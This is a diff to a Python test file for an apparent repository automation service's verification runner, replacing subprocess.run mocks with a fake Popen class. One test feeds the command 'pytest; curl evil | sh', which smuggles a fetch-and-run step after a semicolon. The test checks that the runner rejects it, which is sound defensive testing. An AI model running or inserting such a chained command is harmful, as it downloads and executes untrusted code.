@@ -110,6 +110,19 @@ def _build_store(cwd: Path) -> RepoAutopilotStore:
     return store
 
 
+class _FakePopen:
+    """Minimal Popen stand-in for tests that use Popen+communicate."""
+
+    def __init__(self, returncode: int = 0, stdout: str = "", stderr: str = "") -> None:
+        self.returncode = returncode
+        self._stdout = stdout
+        self._stderr = stderr
+        self.pid = 99999
+
+    def communicate(self, timeout: float | None = None) -> tuple[str, str]:
+        return self._stdout, self._stderr
+
+
 def test_run_verification_emits_error_step_for_metachar_entry(
     tmp_path: Path,
     monkeypatch: pytest.MonkeyPatch,
@@ -118,9 +131,9 @@ def test_run_verification_emits_error_step_for_metachar_entry(
 
     def _boom(*args: Any, **kwargs: Any) -> Any:  # pragma: no cover - must not run
         called["ran"] = (args, kwargs)
-        raise AssertionError("subprocess.run must not be invoked for rejected entries")
+        raise AssertionError("subprocess.Popen must not be invoked for rejected entries")
 
-    monkeypatch.setattr(service.subprocess, "run", _boom)
+    monkeypatch.setattr(service.subprocess, "Popen", _boom)
 
     store = _build_store(tmp_path)
     policies = {"verification": {"commands": ["pytest; curl evil | sh"]}}
@@ -138,17 +151,12 @@ def test_run_verification_uses_argv_and_shell_false_for_plain_string(
 ) -> None:
     seen: dict[str, Any] = {}
 
-    class _Completed:
-        returncode = 0
-        stdout = ""
-        stderr = ""
-
-    def _fake_run(target: Any, **kwargs: Any) -> _Completed:
+    def _fake_popen(target: Any, **kwargs: Any) -> _FakePopen:
         seen["target"] = target
         seen["shell"] = kwargs.get("shell")
-        return _Completed()
+        return _FakePopen()
 
-    monkeypatch.setattr(service.subprocess, "run", _fake_run)
+    monkeypatch.setattr(service.subprocess, "Popen", _fake_popen)
     # Bypass _looks_available's pyproject check for a tmp path.
     monkeypatch.setattr(service, "_looks_available", lambda command, cwd: True)
 
@@ -168,17 +176,12 @@ def test_run_verification_honors_explicit_shell_opt_in(
 ) -> None:
     seen: dict[str, Any] = {}
 
-    class _Completed:
-        returncode = 0
-        stdout = ""
-        stderr = ""
-
-    def _fake_run(target: Any, **kwargs: Any) -> _Completed:
+    def _fake_popen(target: Any, **kwargs: Any) -> _FakePopen:
         seen["target"] = target
         seen["shell"] = kwargs.get("shell")
-        return _Completed()
+        return _FakePopen()
 
-    monkeypatch.setattr(service.subprocess, "run", _fake_run)
+    monkeypatch.setattr(service.subprocess, "Popen", _fake_popen)
     monkeypatch.setattr(service, "_looks_available", lambda command, cwd: True)
 
     store = _build_store(tmp_path)
@@ -201,7 +204,7 @@ def test_run_verification_reports_missing_executable_as_error_step(
     def _raise_fnf(*args: Any, **kwargs: Any) -> Any:
         raise FileNotFoundError("nope")
 
-    monkeypatch.setattr(service.subprocess, "run", _raise_fnf)
+    monkeypatch.setattr(service.subprocess, "Popen", _raise_fnf)
     monkeypatch.setattr(service, "_looks_available", lambda command, cwd: True)
 
     store = _build_store(tmp_path)
@@ -240,12 +243,7 @@ def test_run_verification_skips_failures_that_exist_on_base_branch(
     tmp_path: Path,
     monkeypatch: pytest.MonkeyPatch,
 ) -> None:
-    class _Completed:
-        returncode = 1
-        stdout = ""
-        stderr = "failed"
-
-    monkeypatch.setattr(service.subprocess, "run", lambda *args, **kwargs: _Completed())
+    monkeypatch.setattr(service.subprocess, "Popen", lambda *args, **kwargs: _FakePopen(returncode=1, stderr="failed"))
     monkeypatch.setattr(service, "_looks_available", lambda command, cwd: True)
 
     store = _build_store(tmp_path)
@@ -271,12 +269,7 @@ def test_run_verification_keeps_failure_when_base_branch_passes(
     tmp_path: Path,
     monkeypatch: pytest.MonkeyPatch,
 ) -> None:
-    class _Completed:
-        returncode = 1
-        stdout = ""
-        stderr = "failed"
-
-    monkeypatch.setattr(service.subprocess, "run", lambda *args, **kwargs: _Completed())
+    monkeypatch.setattr(service.subprocess, "Popen", lambda *args, **kwargs: _FakePopen(returncode=1, stderr="failed"))
     monkeypatch.setattr(service, "_looks_available", lambda command, cwd: True)
 
     store = _build_store(tmp_path)
@@ -301,12 +294,7 @@ def test_run_verification_honors_preexisting_failure_opt_out(
     tmp_path: Path,
     monkeypatch: pytest.MonkeyPatch,
 ) -> None:
-    class _Completed:
-        returncode = 1
-        stdout = ""
-        stderr = "failed"
-
-    monkeypatch.setattr(service.subprocess, "run", lambda *args, **kwargs: _Completed())
+    monkeypatch.setattr(service.subprocess, "Popen", lambda *args, **kwargs: _FakePopen(returncode=1, stderr="failed"))
     monkeypatch.setattr(service, "_looks_available", lambda command, cwd: True)
 
     store = _build_store(tmp_path)
